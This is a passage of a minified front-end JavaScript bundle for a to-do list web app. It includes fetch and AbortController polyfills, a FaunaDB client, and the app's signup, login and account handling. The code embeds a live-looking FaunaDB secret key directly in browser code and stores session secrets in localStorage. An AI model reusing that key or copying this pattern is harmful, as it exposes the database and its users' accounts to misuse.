r.listener.handleEvent=="function"&&r.listener.handleEvent(o);if(ku(o))break;r=r.next}return hs(o,null),Nu(o,0),Pu(o,null),!o.defaultPrevented}};Object.defineProperty(K.prototype,"constructor",{value:K,configurable:!0,writable:!0});typeof window!="undefined"&&typeof window.EventTarget!="undefined"&&Object.setPrototypeOf(K.prototype,window.EventTarget.prototype);var Se=class extends K{constructor(){throw super(),new TypeError("AbortSignal cannot be constructed directly")}get aborted(){let t=rt.get(this);if(typeof t!="boolean")throw new TypeError(`Expected 'this' to be an 'AbortSignal' object, but got ${this===null?"null":typeof this}`);return t}};ws(Se.prototype,"abort");function ju(){let e=Object.create(Se.prototype);return K.call(e),rt.set(e,!1),e}function Fu(e){rt.get(e)===!1&&(rt.set(e,!0),e.dispatchEvent({type:"abort"}))}var rt=new WeakMap;Object.defineProperties(Se.prototype,{aborted:{enumerable:!0}});typeof Symbol=="function"&&typeof Symbol.toStringTag=="symbol"&&Object.defineProperty(Se.prototype,Symbol.toStringTag,{configurable:!0,value:"AbortSignal"});var at=class{constructor(){bs.set(this,ju())}get signal(){return Ts(this)}abort(){Fu(Ts(this))}},bs=new WeakMap;function Ts(e){let t=bs.get(e);if(t==null)throw new TypeError(`Expected 'this' to be an 'AbortController' object, but got ${e===null?"null":typeof e}`);return t}Object.defineProperties(at.prototype,{signal:{enumerable:!0},abort:{enumerable:!0}});typeof Symbol=="function"&&typeof Symbol.toStringTag=="symbol"&&Object.defineProperty(at.prototype,Symbol.toStringTag,{configurable:!0,value:"AbortController"});var Ne=typeof self!="undefined"?self:typeof window!="undefined"?window:typeof global!="undefined"?global:void 0;Ne&&(typeof Ne.AbortController=="undefined"&&(Ne.AbortController=at),typeof Ne.AbortSignal=="undefined"&&(Ne.AbortSignal=Se));var Bu=ni(function(e,t){var n=typeof self!="undefined"?self:re,r=function(){function u(){this.fetch=!1,this.DOMException=n.DOMException}return u.prototype=n,new u}();(function(u){(function(f){var l={searchParams:"URLSearchParams"in u,iterable:"Symbol"in u&&"iterator"in Symbol,blob:"FileReader"in u&&"Blob"in u&&function(){try{return new Blob,!0}catch(c){return!1}}(),formData:"FormData"in u,arrayBuffer:"ArrayBuffer"in u};function m(c){return c&&DataView.prototype.isPrototypeOf(c)}if(l.arrayBuffer)var p=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],w=ArrayBuffer.isView||function(c){return c&&p.indexOf(Object.prototype.toString.call(c))>-1};function b(c){if(typeof c!="string"&&(c=String(c)),/[^a-z0-9\-#$%&'*+.^_`|~]/i.test(c))throw new TypeError("Invalid character in header field name");return c.toLowerCase()}function N(c){return typeof c!="string"&&(c=String(c)),c}function te(c){var d={next:function(){var v=c.shift();return{done:v===void 0,value:v}}};return l.iterable&&(d[Symbol.iterator]=function(){return d}),d}function _(c){this.map={},c instanceof _?c.forEach(function(d,v){this.append(v,d)},this):Array.isArray(c)?c.forEach(function(d){this.append(d[0],d[1])},this):c&&Object.getOwnPropertyNames(c).forEach(function(d){this.append(d,c[d])},this)}_.prototype.append=function(c,d){c=b(c),d=N(d);var v=this.map[c];this.map[c]=v?v+", "+d:d},_.prototype.delete=function(c){delete this.map[b(c)]},_.prototype.get=function(c){return c=b(c),this.has(c)?this.map[c]:null},_.prototype.has=function(c){return this.map.hasOwnProperty(b(c))},_.prototype.set=function(c,d){this.map[b(c)]=N(d)},_.prototype.forEach=function(c,d){for(var v in this.map)this.map.hasOwnProperty(v)&&c.call(d,this.map[v],v,this)},_.prototype.keys=function(){var c=[];return this.forEach(function(d,v){c.push(v)}),te(c)},_.prototype.values=function(){var c=[];return this.forEach(function(d){c.push(d)}),te(c)},_.prototype.entries=function(){var c=[];return this.forEach(function(d,v){c.push([v,d])}),te(c)},l.iterable&&(_.prototype[Symbol.iterator]=_.prototype.entries);function Oe(c){if(c.bodyUsed)return Promise.reject(new TypeError("Already read"));c.bodyUsed=!0}function Be(c){return new Promise(function(d,v){c.onload=function(){d(c.result)},c.onerror=function(){v(c.error)}})}function ne(c){var d=new FileReader,v=Be(d);return d.readAsArrayBuffer(c),v}function P(c){var d=new FileReader,v=Be(d);return d.readAsText(c),v}function me(c){for(var d=new Uint8Array(c),v=new Array(d.length),I=0;I<d.length;I++)v[I]=String.fromCharCode(d[I]);return v.join("")}function Me(c){if(c.slice)return c.slice(0);var d=new Uint8Array(c.byteLength);return d.set(new Uint8Array(c)),d.buffer}function he(){return this.bodyUsed=!1,this._initBody=function(c){this._bodyInit=c,c?typeof c=="string"?this._bodyText=c:l.blob&&Blob.prototype.isPrototypeOf(c)?this._bodyBlob=c:l.formData&&FormData.prototype.isPrototypeOf(c)?this._bodyFormData=c:l.searchParams&&URLSearchParams.prototype.isPrototypeOf(c)?this._bodyText=c.toString():l.arrayBuffer&&l.blob&&m(c)?(this._bodyArrayBuffer=Me(c.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):l.arrayBuffer&&(ArrayBuffer.prototype.isPrototypeOf(c)||w(c))?this._bodyArrayBuffer=Me(c):this._bodyText=c=Object.prototype.toString.call(c):this._bodyText="",this.headers.get("content-type")||(typeof c=="string"?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):l.searchParams&&URLSearchParams.prototype.isPrototypeOf(c)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},l.blob&&(this.blob=function(){var c=Oe(this);if(c)return c;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))},this.arrayBuffer=function(){return this._bodyArrayBuffer?Oe(this)||Promise.resolve(this._bodyArrayBuffer):this.blob().then(ne)}),this.text=function(){var c=Oe(this);if(c)return c;if(this._bodyBlob)return P(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(me(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},l.formData&&(this.formData=function(){return this.text().then(He)}),this.json=function(){return this.text().then(JSON.parse)},this}var Ue=["DELETE","GET","HEAD","OPTIONS","POST","PUT"];function dt(c){var d=c.toUpperCase();return Ue.indexOf(d)>-1?d:c}function J(c,d){d=d||{};var v=d.body;if(c instanceof J){if(c.bodyUsed)throw new TypeError("Already read");this.url=c.url,this.credentials=c.credentials,d.headers||(this.headers=new _(c.headers)),this.method=c.method,this.mode=c.mode,this.signal=c.signal,!v&&c._bodyInit!=null&&(v=c._bodyInit,c.bodyUsed=!0)}else this.url=String(c);if(this.credentials=d.credentials||this.credentials||"same-origin",(d.headers||!this.headers)&&(this.headers=new _(d.headers)),this.method=dt(d.method||this.method||"GET"),this.mode=d.mode||this.mode||null,this.signal=d.signal||this.signal,this.referrer=null,(this.method==="GET"||this.method==="HEAD")&&v)throw new TypeError("Body not allowed for GET or HEAD requests");this._initBody(v)}J.prototype.clone=function(){return new J(this,{body:this._bodyInit})};function He(c){var d=new FormData;return c.trim().split("&").forEach(function(v){if(v){var I=v.split("="),L=I.shift().replace(/\+/g," "),T=I.join("=").replace(/\+/g," ");d.append(decodeURIComponent(L),decodeURIComponent(T))}}),d}function Ks(c){var d=new _,v=c.replace(/\r?\n[\t ]+/g," ");return v.split(/\r?\n/).forEach(function(I){var L=I.split(":"),T=L.shift().trim();if(T){var qe=L.join(":").trim();d.append(T,qe)}}),d}he.call(J.prototype);function H(c,d){d||(d={}),this.type="default",this.status=d.status===void 0?200:d.status,this.ok=this.status>=200&&this.status<300,this.statusText="statusText"in d?d.statusText:"OK",this.headers=new _(d.headers),this.url=d.url||"",this._initBody(c)}he.call(H.prototype),H.prototype.clone=function(){return new H(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new _(this.headers),url:this.url})},H.error=function(){var c=new H(null,{status:0,statusText:""});return c.type="error",c};var Qs=[301,302,303,307,308];H.redirect=function(c,d){if(Qs.indexOf(d)===-1)throw new RangeError("Invalid status code");return new H(null,{status:d,headers:{location:c}})},f.DOMException=u.DOMException;try{new f.DOMException}catch(c){f.DOMException=function(d,v){this.message=d,this.name=v;var I=Error(d);this.stack=I.stack},f.DOMException.prototype=Object.create(Error.prototype),f.DOMException.prototype.constructor=f.DOMException}function mt(c,d){return new Promise(function(v,I){var L=new J(c,d);if(L.signal&&L.signal.aborted)return I(new f.DOMException("Aborted","AbortError"));var T=new XMLHttpRequest;function qe(){T.abort()}T.onload=function(){var Le={status:T.status,statusText:T.statusText,headers:Ks(T.getAllResponseHeaders()||"")};Le.url="responseURL"in T?T.responseURL:Le.headers.get("X-Request-URL");var ht="response"in T?T.response:T.responseText;v(new H(ht,Le))},T.onerror=function(){I(new TypeError("Network request failed"))},T.ontimeout=function(){I(new TypeError("Network request failed"))},T.onabort=function(){I(new f.DOMException("Aborted","AbortError"))},T.open(L.method,L.url,!0),L.credentials==="include"?T.withCredentials=!0:L.credentials==="omit"&&(T.withCredentials=!1),"responseType"in T&&l.blob&&(T.responseType="blob"),L.headers.forEach(function(Le,ht){T.setRequestHeader(ht,Le)}),L.signal&&(L.signal.addEventListener("abort",qe),T.onreadystatechange=function(){T.readyState===4&&L.signal.removeEventListener("abort",qe)}),T.send(typeof L._bodyInit=="undefined"?null:L._bodyInit)})}return mt.polyfill=!0,u.fetch||(u.fetch=mt,u.Headers=_,u.Request=J,u.Response=H),f.Headers=_,f.Request=J,f.Response=H,f.fetch=mt,Object.defineProperty(f,"__esModule",{value:!0}),f})({})})(r),r.fetch.ponyfill=!0,delete r.fetch.polyfill;var o=r;t=o.fetch,t.default=o.fetch,t.fetch=o.fetch,t.Headers=o.Headers,t.Request=o.Request,t.Response=o.Response,e.exports=t});function xs(e){e=e||{},this.type="fetch",this._fetch=Mu(e.fetch),h.isNodeEnv()&&e.keepAlive&&(this._keepAliveEnabledAgent=new(e.isHttps,$).Agent({keepAlive:!0}))}xs.prototype.execute=function(e){var t=e.signal,n=!e.signal&&!!e.timeout,r,o=function(){r&&clearTimeout(r)},u=function(m){o();var p=Hu(m.headers),w=m.ok&&e.streamConsumer!=null;return w?(Uu(m,e.streamConsumer),{body:"[stream]",headers:p,status:m.status}):m.text().then(function(b){return{body:b,headers:p,status:m.status}})},f=function(m){return o(),Promise.reject(Es(m,n))};if(n){var l=new AbortController;t=l.signal,r=setTimeout(l.abort.bind(l),e.timeout)}return this._fetch(h.formatUrl(e.origin,e.path,e.query),{method:e.method,headers:e.headers,body:e.body,agent:this._keepAliveEnabledAgent,signal:t}).then(u).catch(f)};function Uu(e,t){var n=function(u){t.onError(Es(u))};if(h.isNodeEnv()){e.body.on("error",n).on("data",t.onData).on("end",function(){t.onError(new TypeError("network error"))});return}try{let u=function(){return r.read().then(function(f){if(!f.done){var l=o.decode(f.value,{stream:!0});return t.onData(l),u()}t.onError(new TypeError("network error"))})};var r=e.body.getReader(),o=new TextDecoder("utf-8");u().catch(n)}catch(u){throw new q.StreamsNotSupported("Please, consider providing a Fetch API-compatible function with streamable response bodies. "+u)}}function Es(e,t){var n=e&&e.name==="AbortError";return n?t?new xe.TimeoutError:new xe.AbortError:e}function Mu(e){return typeof e=="function"?e:typeof re.fetch=="function"?re.fetch.bind(re):Bu}function Hu(e){var t={};for(var n of e.entries()){var r=n[0],o=n[1];t[r]=o}return t}var qu=xs,{getBrowserOsDetails:Wu}=h,_e=h;function ot(e){var t=e.scheme==="https";e.port||(e.port=t?443:80);var n=!e.fetch&&_e.isNodeEnv()&&Vu();this._adapter=n?new Ou:new qu({isHttps:t,fetch:e.fetch,keepAlive:e.keepAlive}),this._baseUrl=e.scheme+"://"+e.domain+":"+e.port,this._secret=e.secret,this._headers=Object.assign({},e.headers,$u()),this._queryTimeout=e.queryTimeout,this._lastSeen=null,this._timeout=Math.floor(e.timeout*1e3)}ot.prototype.getLastTxnTime=function(){return this._lastSeen};ot.prototype.syncLastTxnTime=function(e){(this._lastSeen==null||this._lastSeen<e)&&(this._lastSeen=e)};ot.prototype.execute=function(e){e=e||{};var t=e.streamConsumer&&(typeof e.streamConsumer.onData!="function"||typeof e.streamConsumer.onError!="function");if(t)return Promise.reject(new TypeError('Invalid "streamConsumer" provided'));var n=e.secret||this._secret,r=e.queryTimeout||this._queryTimeout,o=this._headers;return o.Authorization=n&&Ju(n),o["X-Last-Seen-Txn"]=this._lastSeen,o["X-Query-Timeout"]=r,this._adapter.execute({origin:this._baseUrl,path:e.path||"/",query:e.query,method:e.method||"GET",headers:_e.removeNullAndUndefinedValues(o),body:e.body,signal:e.signal,timeout:this._timeout,streamConsumer:e.streamConsumer})};function Ju(e){return"Bearer "+e}function $u(){var e={driver:["javascript",Ot.version].join("-")};if(_e.isNodeEnv()){e.runtime=["nodejs",$e.version].join("-"),e.env=_e.getNodeRuntimeEnv();var t=$;e.os=[t.platform(),t.release()].join("-")}else e.runtime=_e.getBrowserDetails(),e.env="unknown",e.os=Wu();var n={"X-FaunaDB-API-Version":Ot.apiVersion};return _e.isNodeEnv()&&(n["X-Driver-Env"]=Object.keys(e).map(r=>[r,e[r].toLowerCase()].join("=")).join("; ")),n}function Vu(){try{return!0}catch(e){return!1}}var Ss={HttpClient:ot,TimeoutError:xe.TimeoutError,AbortError:xe.AbortError};function Gu(e,t){return t=typeof t!="undefined"?t:!1,t?JSON.stringify(e,null,"  "):JSON.stringify(e)}function kt(e){return JSON.parse(e,Dt)}function Xu(e){var t=[];try{t.push(kt(e)),e=""}catch(o){for(;;){var n=e.indexOf(`
`)+1;if(n<=0)break;var r=e.slice(0,n).trim();r.length>0&&t.push(kt(r)),e=e.slice(n)}}return{values:t,buffer:e}}function Dt(e,t){if(typeof t!="object"||t===null)return t;if("@ref"in t){var n=t["@ref"];if(!("collection"in n)&&!("database"in n))return U.Native.fromName(n.id);var r=Dt("collection",n.collection),o=Dt("database",n.database);return new U.Ref(n.id,r,o)}else return"@obj"in t?t["@obj"]:"@set"in t?new U.SetRef(t["@set"]):"@ts"in t?new U.FaunaTime(t["@ts"]):"@date"in t?new U.FaunaDate(t["@date"]):"@bytes"in t?new U.Bytes(t["@bytes"]):"@query"in t?new U.Query(t["@query"]):t}var st={toJSON:Gu,parseJSON:kt,parseJSONStreaming:Xu},_s=["start","error","version","history_rewrite"],zu=_s.concat(["snapshot"]);function Pe(e,t,n,r){n=h.applyDefaults(n,{fields:null}),this._client=e,this._onEvent=r,this._query=se.wrap(t),this._urlParams=n.fields?{fields:n.fields.join(",")}:null,this._abort=new AbortController,this._state="idle"}Pe.prototype.snapshot=function(){var e=this;e._client.query(se.Get(e._query)).then(function(t){e._onEvent({type:"snapshot",event:t})}).catch(function(t){e._onEvent({type:"error",event:t})})};Pe.prototype.subscribe=function(){var e=this;if(e._state==="idle")e._state="open";else throw new Error("Subscription#start should not be called several times, consider instantiating a new stream instead.");var t=JSON.stringify(e._query),n=Date.now(),r="";function o(l){var m=Date.now(),p;try{p=st.parseJSON(l.body)}catch(b){p=l.body}var w=new Lt("POST","stream",e._urlParams,t,e._query,l.body,p,l.status,l.headers,n,m);e._client._handleRequestResult(l,w)}function u(l){var m=st.parseJSONStreaming(r+l);r=m.buffer,m.values.forEach(function(p){p.txn!==void 0&&e._client.syncLastTxnTime(p.txn),p.event==="error"?f(new q.StreamErrorEvent(p)):e._onEvent(p)})}function f(l){l instanceof Ss.AbortError||e._onEvent({type:"error",event:l})}e._client._http.execute({method:"POST",path:"stream",body:t,query:e._urlParams,signal:this._abort.signal,streamConsumer:{onError:f,onData:u}}).then(o).catch(f)};Pe.prototype.close=function(){this._state!=="closed"&&(this._state="closed",this._abort.abort())};function it(e){this._allowedEvents=e,this._listeners={}}it.prototype.on=function(e,t){if(this._allowedEvents.indexOf(e)===-1)throw new Error("Unknown event type: "+e);this._listeners[e]===void 0&&(this._listeners[e]=[]),this._listeners[e].push(t)};it.prototype.dispatch=function(e){var t=this._listeners[e.type];if(!!t)for(var n=0;n<t.length;n++)t[n].call(null,e.event,e)};function Re(e,t){this._client=e,this._dispatcher=t}Re.prototype.on=function(e,t){return this._dispatcher.on(e,t),this};Re.prototype.start=function(){return this._client.subscribe(),this};Re.prototype.close=function(){this._client.close()};function Yu(e){var t=function(n,r){var o=new it(_s),u=new Pe(e,n,r,function(f){o.dispatch(f)});return new Re(u,o)};return t.document=function(n,r){var o=[],u=!0,f=new it(zu),l=new Pe(e,n,r,m);function m(w){switch(w.type){case"start":f.dispatch(w),l.snapshot();break;case"snapshot":p(w);break;case"error":f.dispatch(w);break;default:u?o.push(w):f.dispatch(w)}}function p(w){f.dispatch(w);for(var b=0;b<o.length;b++){var N=o[b];N.txn>w.event.ts&&f.dispatch(N)}u=!1,o=null}return new Re(l,f)},t}var Ku={StreamAPI:Yu},Qu=se;function Q(e){e=h.applyDefaults(e,{domain:"db.fauna.com",scheme:"https",port:null,secret:null,timeout:60,observer:null,keepAlive:!0,headers:{},fetch:void 0,queryTimeout:null}),this._observer=e.observer,this._http=new Ss.HttpClient(e),this.stream=Ku.StreamAPI(this)}Q.apiVersion=Ot.apiVersion;Q.prototype.query=function(e,t){return this._execute("POST","",Qu.wrap(e),null,t)};Q.prototype.paginate=function(e,t,n){return t=h.defaults(t,{}),n=h.defaults(n,{}),new os(this,e,t,n)};Q.prototype.ping=function(e,t){return this._execute("GET","ping",null,{scope:e,timeout:t})};Q.prototype.getLastTxnTime=function(){return this._http.getLastTxnTime()};Q.prototype.syncLastTxnTime=function(e){this._http.syncLastTxnTime(e)};Q.prototype._execute=function(e,t,n,r,o){r=h.defaults(r,null),(t instanceof U.Ref||h.checkInstanceHasProperty(t,"_isFaunaRef"))&&(t=t.value),r!==null&&(r=h.removeUndefinedValues(r));var u=Date.now(),f=this,l=["GET","HEAD"].indexOf(e)>=0?void 0:JSON.stringify(n);return this._http.execute(Object.assign({},o,{path:t,query:r,method:e,body:l})).then(function(m){var p=Date.now(),w=st.parseJSON(m.body),b=new Lt(e,t,r,l,n,m.body,w,m.status,m.headers,u,p);return f._handleRequestResult(m,b,o),w.resource})};Q.prototype._handleRequestResult=function(e,t,n){var r="x-txn-time";e.headers[r]!=null&&this.syncLastTxnTime(parseInt(e.headers[r],10));var o=[this._observer,n&&n.observer];o.forEach(u=>{typeof u=="function"&&u(t,this)}),q.FaunaHTTPError.raiseForStatusCode(t)};var Zu=Q;function ec(e){return function(t,n){return e(As(t),n)}}function As(e){var t=e.query,n=e.method,r=e.path,o=e.requestContent,u=e.responseHeaders,f=e.responseContent,l=e.statusCode,m=e.timeTaken,p="";function w(b){p=p+b}return w("Fauna "+n+" /"+r+tc(t)+`
`),o!=null&&w("  Request JSON: "+Nt(o)+`
`),w("  Response headers: "+Nt(u)+`
`),w("  Response JSON: "+Nt(f)+`
`),w("  Response ("+l+"): Network latency "+m+`ms
`),p}function nc(e){var t="  ";return e.split(`
`).join(`
`+t)}function Nt(e){return nc(st.toJSON(e,!0))}function tc(e){if(e==null)return"";var t=Object.keys(e);if(t.length===0)return"";var n=t.map(function(r){return r+"="+e[r]});return"?"+n.join("&")}var rc={logger:ec,showRequestResult:As},ac=h.mergeObjects({Client:Zu,Expr:s,PageHelper:os,RequestResult:Lt,clientLogger:rc,errors:q,values:U,query:se},se),Z=ac;var{Call:oc,Collection:je,Create:sc,Delete:ic,Function:uc,Get:Dc,Index:cc,Login:lc,Logout:fc,Match:dc,Ref:ut,Update:Pt}=Z.query,Cs=new Z.Client({secret:"fnAEFqW7-SACAUHgPKXFlUR8R5HWmUVgUKSUWz3c"}),Os=async(e,t,n,r,o=!1)=>{let{data:u}=await Cs.query(sc(je("users"),{credentials:{password:r},data:{email:e,firstName:t,lastName:n,passUpdateTs:0,selectedListId:"",todoLists:[],tosAgreement:o}}));return delete u.passUpdateTs,delete u.tosAgreement,u},Rt=async(e,t)=>{let n=await Cs.query(lc(dc(cc("users_by_email"),e),{password:t}));return{userRef:n.instance.id,secret:n.secret}},Ls=async e=>await new Z.Client({secret:e}).query(fc(!0)),Is=async(e,t,n,{userRef:r,secret:o})=>{let{data:u}=await new Z.Client({secret:o}).query(Pt(ut(je("users"),r),{data:{email:e,firstName:t,lastName:n}}));return{email:u.email,firstName:u.firstName,lastName:u.lastName}},Ds=async(e,{userRef:t,secret:n})=>{let r=await new Z.Client({secret:n}).query(Pt(ut(je("users"),t),{credentials:{password:e},data:{passUpdateTs:Date.now()*1e3}}));return"data"in r},jt=async({userRef:e,secret:t})=>{let{data:n}=await new Z.Client({secret:t}).query(oc(uc("getUserDoc"),e));return delete n.tosAgreement,delete n.passUpdateTs,n},ks=async({userRef:e,secret:t})=>{let{data:n}=await new Z.Client({secret:t}).query(ic(ut(je("users"),e)));return n},Ns=async(e,t,{userRef:n,secret:r})=>{if(typeof e!="object"&&!(e instanceof Array))throw Error("Invalid type of data");let{data:o}=await new Z.Client({secret:r}).query(Pt(ut(je("users"),n),{data:{todoLists:e,selectedListId:t}}));return{todoLists:o.todoLists,selectedListId:o.selectedListId}};var Ft="todos.session.tokens",g=null,Ps=null,Bt=!1,y=e=>document.querySelector(e),V=e=>document.querySelectorAll(e),fe=y("#mobile-menu"),Mt=y("#mobile-menu-open"),ct=y("#sidebar"),Rs=y("#sidebar-overlay"),Ut=y("#enable-notifications"),js=y("#dropdown-tools"),Ht=V("[data-dashboard-button]"),qt=V("[data-account-button]"),Wt=y("[data-todos]"),$t=y("[data-new-todo-input]"),Fs=y("[data-todo-display-tasks]"),M=y("[data-todo-title]"),Vt=y("[data-save-list-name]"),lt=y("[data-tasks]"),Bs=y("[data-new-task-input]");y("#home-link").addEventListener("click",e=>{e.preventDefault(),ie(),Ae()?(ee("#dashboard-component"),Ce("dashboard")):ee("#home-component")});V("[data-signup-button]").forEach(e=>e.addEventListener("click",t=>{t.preventDefault(),y("#signup-form").querySelector("[data-error-msg]").innerText="",ie(),ee("#signup-component"),fe.classList.contains("hidden")||de()}));V("[data-login-button]").forEach(e=>e.addEventListener("click",t=>{t.preventDefault(),y("#login-form").querySelector("[data-error-msg]").innerText="",ie(),ee("#login-component"),fe.classList.contains("hidden")||de()}));V("[data-logout-button]").forEach(e=>e.addEventListener("click",async t=>{if(t.preventDefault(),fe.classList.contains("hidden")||de(),Ae()){O("Logging you out...");try{await Ls(k().secret)&&(Jt(),O())}catch(n){console.error("fLogout >>>",n.message),O()}}}));Ht.forEach(e=>e.addEventListener("click",t=>{t.preventDefault(),ie(),ee("#dashboard-component"),Ce("dashboard"),fe.classList.contains("hidden")||de()}));qt.forEach(e=>e.addEventListener("click",t=>{t.preventDefault(),y("#account-form").querySelector("[data-error-msg]").innerText="",y("[data-acc-ref-id]").innerText=k().userRef,y("#account-form #email-address-account").value=g.email,y("#account-form #first-name-account").value=g.firstName,y("#account-form #last-name-account").value=g.lastName,ie(),ee("#account-component"),Ce("account"),fe.classList.contains("hidden")||de()}));Mt.addEventListener("click",de);y("#mobile-menu-close").addEventListener("click",de);y("#sidebar-open").addEventListener("click",Fe);Rs.addEventListener("click",Fe);y("#add-todo-sidebar").addEventListener("click",e=>{e.preventDefault(),ct.classList.contains("hidden")&&Fe(),$t.focus()});Ut.addEventListener("click",mc);y("#dropdown-toggle").addEventListener("click",ft);V("form").forEach(e=>e.addEventListener("submit",hc));y("#delete-account").addEventListener("click",pc);function Ms(e){return typeof e=="object"&&"userRef"in e&&"secret"in e?(localStorage.setItem(Ft,JSON.stringify(e)),!0):!1}function Us(){g=null,localStorage.removeItem(Ft)}function k(){return JSON.parse(localStorage.getItem(Ft))||null}function Ae(){return k()!==null&&typeof k()=="object"&&"userRef"in k()&&"secret"in k()&&g!==null&&typeof g=="object"&&"email"in g&&"firstName"in g&&"lastName"in g&&"selectedListId"in g&&"todoLists"in g}function O(e){e&&(y("[data-info-msg]").innerText=e),y("#show-loader").classList.toggle("hidden")}function Gt(e){y("[data-info-msg]").innerText=e}function de(e){fe.classList.toggle("hidden"),fe.classList.contains("hidden")?Mt.setAttribute("aria-expanded","false"):Mt.setAttribute("aria-expanded","true")}function Fe(e){ct.classList.toggle("hidden"),Rs.classList.toggle("hidden")}function ft(e){js.classList.toggle("hidden")}async function hc(e){e.preventDefault();let t=e.target.id;if(t==="signup-form"||t==="login-form"||t==="account-form"){let n=e.target.querySelector("[data-error-msg]"),r=e.target.querySelector("[data-success-msg]"),o={},u=e.target.elements;for(let f=0;f<u.length;f++){let l=u[f];l.type!=="submit"&&(o[l.name]=l.type=="checkbox"?l.checked:l.value.trim())}if(!gc(o,t)){n.innerText="Missing or invalid field(s) supplied";return}if(t==="signup-form"){O("Signing you up...");try{g={...await Os(o.email,o.firstName,o.lastName,o.password,o.tosAgreement)},Gt("Loading your dashboard...");let l=await Rt(o.email,o.password);if(!Ms(l))throw Error("Cannot get user credentials");Xt(),e.target.reset(),O()}catch(f){console.error("fSignup/fLogin error >>>",f.message),n.innerText=`Sign Up error: ${f.message.replace("instance","email")}`,O()}}if(t==="login-form"){O("Logging you in...");try{let f=await Rt(o.email,o.password);if(Ms(f))Gt("Loading your dashboard..."),g={...await jt({...f})},Xt(),e.target.reset(),O();else throw Error("Cannot get user credentials")}catch(f){console.error("fLogin/fGetUserData >>>",f.message),n.innerText=`Log In error: ${f.message}`,O()}}if(t==="account-form"&&Ae()){O("Updating your details...");try{let f=await Is(o.email,o.firstName,o.lastName,{...k()});g={...g,...f},Hs(),o.password&&(Gt("Updating your password..."),await Ds(o.password,{...k()}),y("#account-form #password-account").value=""),r.innerText="Update successful",O(),setTimeout(()=>{r.innerText=""},3e3)}catch(f){console.error("fUpdateAccount/fUpdatePassword >>>",f.message),n.innerText=`Update error: ${f.message}`,O()}}}if(t==="new-todo-form"&&Ae()){let n=$t.value.trim();if(n===null||n===""||g.todoLists.some(o=>o.name==n))return;let r=yc(n);$t.value=null,g.todoLists.push(r),g.selectedListId=r.id,ue(),ct.classList.contains("hidden")||Fe()}if(t==="new-task-form"&&Ae()){let n=Bs.value;if(n===null||n==="")return;let r=wc(n);Bs.value=null,g.todoLists.find(u=>u.id===g.selectedListId).tasks.push(r),ue()}}function gc(e,t){e=typeof e=="object"&&e!==null?e:!1;let{email:n,firstName:r,lastName:o,password:u,tosAgreement:f}=e;return e&&t==="signup-form"?typeof r=="string"&&r.length>0&&typeof o=="string"&&o.length>0&&typeof n=="string"&&zt(n)&&typeof u=="string"&&u.length>=4&&typeof f=="boolean"&&f!==!1:e&&t==="login-form"?typeof n=="string"&&zt(n)&&typeof u=="string"&&u.length>=4:e&&t==="account-form"?typeof r=="string"&&r.length>0&&typeof o=="string"&&o.length>0&&typeof n=="string"&&zt(n)&&typeof u=="string"&&(u===""||u.length>=4):!1}function zt(e){e=typeof e=="string"&&e.length>=6?e:!1;let t=/^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,4})(\]?)$/;return e?t.test(e):!1}function Ce(e){Ht.forEach(t=>t.classList.remove("bg-indigo-200")),qt.forEach(t=>t.classList.remove("bg-indigo-200")),!(e==null||e==null)&&(e==="dashboard"&&Ht.forEach(t=>t.classList.add("bg-indigo-200")),e==="account"&&qt.forEach(t=>t.classList.add("bg-indigo-200")))}function ee(e){y(e).classList.remove("hidden")}function ie(){y("#home-component").classList.add("hidden"),y("#signup-component").classList.add("hidden"),y("#login-component").classList.add("hidden"),y("#dashboard-component").classList.add("hidden"),y("#account-component").classList.add("hidden"),y("#acc-deleted-component").classList.add("hidden")}function vc(){V("[data-logged-out]").forEach(e=>e.classList.add("hidden")),V("[data-logged-in]").forEach(e=>e.classList.remove("hidden"))}function qs(){V("[data-logged-out]").forEach(e=>e.classList.remove("hidden")),V("[data-logged-in]").forEach(e=>e.classList.add("hidden"))}function Hs(){y("[data-user-name]").innerText=`${g.firstName.charAt(0).toUpperCase()}'s Todo Lists`}function Xt(){vc(),ie(),ee("#dashboard-component"),Ce("dashboard"),Hs(),Yt(),Ws(),$s()}function Jt(){qs(),ie(),ee("#home-component"),Ce(void 0),Us(),Vs()}async function pc(e){e.preventDefault(),O("Deleting your account...");try{let t=await ks({...k()});qs(),Ce(void 0),ie(),Us(),y("#acc-deleted-component").classList.remove("hidden"),y("#acc-deleted-component").querySelector("[data-acc-delteted-json]").value=JSON.stringify(t),O()}catch(t){console.error("fDeleteAccount >>>",t.message),O()}}Wt.addEventListener("click",e=>{e.preventDefault(),e.target.tagName.toLowerCase()==="a"&&(g.selectedListId=e.target.dataset.todoId,ue(),ct.classList.contains("hidden")||Fe(),js.classList.contains("hidden")||ft())});lt.addEventListener("click",e=>{if(e.target.name==="task-checkbox"){let t=g.todoLists.find(r=>r.id===g.selectedListId),n=t.tasks.find(r=>r.id===e.target.id);n.completed=e.target.checked,Gs(),Js(t)}"toggleAlarmForm"in e.target.dataset&&(e.preventDefault(),y(`[data-form-id-${e.target.dataset.targetformId}]`).classList.toggle("hidden"))});lt.addEventListener("submit",e=>{e.preventDefault();let t=e.target.dataset.taskId,n,r;if(Array.from(e.target.elements).forEach(u=>{u.name==="alarm-date"&&(n=u.value),u.name==="alarm-time"&&(r=u.value)}),!t||!n||!r)return;let o=g.todoLists.find(({id:u})=>u===g.selectedListId).tasks.find(({id:u})=>u===t);o.alarmDate=n,o.alarmTime=r,o.notified=!1,o.completed=!1,o.overdue=!1,ue(),e.target.classList.toggle("hidden")});M.addEventListener("click",e=>{Vt.classList.remove("hidden"),M.style.backgroundColor="white",M.style.padding="0 